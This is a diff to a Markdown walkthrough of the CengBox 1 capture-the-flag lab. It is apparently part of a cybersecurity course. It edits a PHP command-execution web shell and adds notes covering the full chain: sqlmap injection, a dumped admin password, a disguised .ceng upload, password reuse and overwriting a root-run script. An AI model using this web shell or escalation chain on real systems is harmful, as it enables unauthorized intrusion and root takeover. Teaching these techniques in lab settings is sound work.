@@ -13,6 +13,9 @@
 | **Goal** | *Get the user and the root flag* |
 | **Author's hint** | *"For user you should understand how it works and manipulate it. You might need everything that you'll find. For root, **wait a minute**."* |
 
+> ?? **Learning Path 1 ? Machine 9 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
+> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/09-cengbox-1.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/09-cengbox-1.md)** ? Previous in path: [Machine 8 ? Empire: Breakout](../3-028-empire-breakout/README.md) ? Next in path: [Machine 10 ? PwnLab: init](../3-057-pwnlab-init/README.md)
+
 > **"Wait a minute" is a literal instruction.** The privilege escalation on this box is
 > a background process that fires roughly every 5–30 seconds, invisible to `cron`. You
 > will not find it by reading `/etc/crontab` — you find it with **`pspy`**. That is the
@@ -766,7 +769,7 @@ Error: only CENG file allowed!
 ```bash
 cat > cmd.php <<'EOF'
 <?php
-if (isset($_REQUEST['cmd'])) {
+if (!empty($_REQUEST['cmd'])) {
     header('Content-Type: text/plain');
     system($_REQUEST['cmd'] . ' 2>&1');
 }
@@ -1620,6 +1623,20 @@ cengbox{r00t_fl4g_9d2c8b1e4a7f3d6c}
   - [Apache `RemoveHandler` / `php_flag engine off`](https://httpd.apache.org/docs/current/mod/mod_mime.html#removehandler)
   - [`dirb`](https://tools.kali.org/web-applications/dirb) · [`gobuster`](https://github.com/OJ/gobuster) · [SecLists](https://github.com/danielmiessler/SecLists)
   - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) · [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+
+### Community notes — consensus, pitfalls and alternative routes (cross-checked against the sources below):
+
+- **Consensus chain:** nmap (`22/80`) → `dirb` with `big.txt` → `/masteradmin/` → `dirb ... -X .php` → `login.php`/`upload.php` → `sqlmap --forms` SQLi on `login.php` → dump DB `cengbox` (credentials table **`admin`**) → `masteradmin:C3ng0v3R00T1!` → login → upload a `.ceng` shell (executed as PHP) → `www-data` → `su cengover` (DB password = system password) → `pspy` → overwrite `/opt/md5check.py` (777, root cron) → root.
+- **Common pitfall:** `common.txt` (and even a default `dirb` run) misses `/masteradmin/` — escalate the wordlist to `big.txt` first, then re-run with `-X .php`. Two writeups report the default list found nothing usable.
+- **Common pitfall:** uploads silently "fail" because only `.ceng` is accepted — one writeup lost significant time simply not seeing the error message at the top of the page. Read every error before assuming a dead end.
+- **Common pitfall:** `--dump` is painfully slow because the confirmed injection is partly time-based (every character costs a `SLEEP()`), so read `--tables` first and dump targeted tables (`-D cengbox -T admin`), not `--dump-all`.
+- **Alternative tooling:** sqlmap can be fed a Burp-intercepted request (`sqlmap -r request.txt`) instead of `--forms`, and the shells can be Metasploit `php/meterpreter/reverse_tcp` / `python/meterpreter` payloads (`multi/handler`, `web_delivery`) instead of hand-built netcat reverse shells — same endpoints, different toolkit.
+- **Dead end (documented):** SUID enumeration (`find / -perm -u=s`) yields nothing usable; `/usr/bin/at` is present but refuses to run. Not every standard check pays off — keep going.
+- **⚠️ Verification note:** the credentials table is named **`admin`**, not `users`, and the `lxd` group escape this card mentions is **not** reproduced by the verified writeups — the documented root path is the world-writable `/opt/md5check.py` (root cron, mode 777).
+- **Naming confusion:** one writeup (Bootlesshacker) calls the shell user `cengbox`; HackNos and Hacking Articles — and the box itself — use **`cengover`**.
+- **Hygiene:** back up `/opt/md5check.py` before overwriting and restore it afterwards so the box works for the next learner. `chmod +x` is enough for pspy — do not `chmod 777` your own tools.
+- **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/cengbox-1-vulnhub-walkthrough/) · [HackNos](https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/) · [Bootlesshacker](https://www.bootlesshacker.com/cengbox-ctf-walkthrough/)
 
 ---
 
